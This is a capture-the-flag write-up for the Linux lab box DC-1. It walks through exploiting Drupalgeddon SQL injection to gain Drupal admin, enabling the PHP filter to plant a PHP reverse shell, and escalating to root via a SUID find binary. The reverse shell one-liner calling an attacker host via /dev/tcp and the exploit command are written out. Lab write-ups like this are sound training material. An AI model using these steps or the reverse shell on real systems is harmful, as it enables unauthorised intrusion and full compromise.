---
title: DC-1 Writeup
---
Despite the name, this is not a Domain Controller and is indeed a Linux box!

Starting off with a quick `nmap` scan of the box:

![](https://i.imgur.com/AmKH43e.png)

We see 3 services running on the box:
* `22` - SSH
* `80` - HTTP
* `111` - RPCBind

What really caught my attention was port `80` since it's running `Drupal`, which is an open-source *Content Management System (CMS)* and `nmap` is telling us that it's running version 7 of Drupal which has an SQL injection vulnerability that was dubbed `Drupalgeddon`! 

Exploiting this SQL injection can lead to us adding a new admin user to the CMS which we could abuse to get an initial shell foothold on the host! I used a Python script to exploit this SQL vulnerability which can be [found here](https://www.exploit-db.com/exploits/34992):
*NOTE: This Python exploit is written in Python 2, so you'll need that downloaded in order to run it successfully!*

`python2 drupalexploit.py -t http://192.168.217.193 -u 1d8 -p password`:

![](https://i.imgur.com/hwigLwm.png)

![](https://i.imgur.com/9AaZsJh.png)

And we're able to login to the Drupal instance! If we take a look at our **Roles**, we'll see that we're **administrators**:

![](https://i.imgur.com/zbjyoMx.png)

Fantastic! Now let's get a shell!

According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal), we can get RCE on a Drupal instance by using the **PHP Filter Module**. Let's go to modules > PHP filter > Checkmark it > save configuration!

After that, go to modules > PHP Filter > Permissions > set **the Use PHP Code text format** filter to be allowed by Administrators, then save these permissions:

![](https://i.imgur.com/nSNiWsr.png)

Now we can create a new page on the Drupal instance & set the text format to be PHP code & have the server execute any PHP code that we want!

Go to content > Add Content > Choose either basic page or article > Give the new page a title & insert a PHP reverse shell into the body > Set the text format to be **PHP Code**:

![](https://i.imgur.com/VXLGTAk.png)

* I chose to use the following PHP reverse shell:  `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<Attacker IP Address>/<Attacker Port> 0>&1'");?>`

On your attacker host, you can run `nc -lvnp <port>`, I'll be using [pwncat](https://github.com/calebstewart/pwncat) so in this case, I ran: `pwncat-cs -lp <port>` to start the listening port.

After the listening port has been setup, click **Save** on the Drupal instance & you should get a connection:

![](https://i.imgur.com/d33oC1d.png)

Let's get onto the **privilege escalation** portion!

# Privilege Escalation

We can start by running good ol' `LinPeas.sh`. Since I'm using `pwncat`, I just need to run `upload linpeas.sh` & ensure I'm in the same directory that the file is located in to upload it to the target host.

If you aren't using `linpeas`, starting up a simple python3 web server & `wget` will do just fine though!

After `linpeas.sh` has finished running, you'll notice that under the `SUID` section, it found that the `find` command had the `SUID` bit set. All this means is we're able to run certain binaries using an elevated users' permissions. For us, this means potential privilege escalation:

![](https://i.imgur.com/oHkNiMO.png)

We can cross-reference this with [GTFOBins](https://gtfobins.github.io/gtfobins/find/) to attempt to find any reference to the `find` binary being used for privilege escalation:

![](https://i.imgur.com/JjB5xW6.png)

And we got it! Let's run this command:

![](https://i.imgur.com/JLmcIAj.png)

Notice how it still says the UID is 33 which is `www-data` so this low privilege user still owns the process, though the process still has the full permissions that are granted to the `root` user, even though the process isn't owned by `root`! That's the magic of SUID bits!

One more thing to mention, `pwncat` has a module that can be used for automated privilege escalation named `escalate`, unfortunately though, it didn't seem to find the SUID bit for the `find` binary as an escalation path:

![](https://i.imgur.com/fKQbIKF.png)

Though, when using the `enumerate.file.suid` module, it was able to discover that the `find` binary's SUID bit was set:

![](https://i.imgur.com/IH6qHuV.png)

# References

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal
* https://gtfobins.github.io/gtfobins/find/
* https://github.com/calebstewart/pwncat
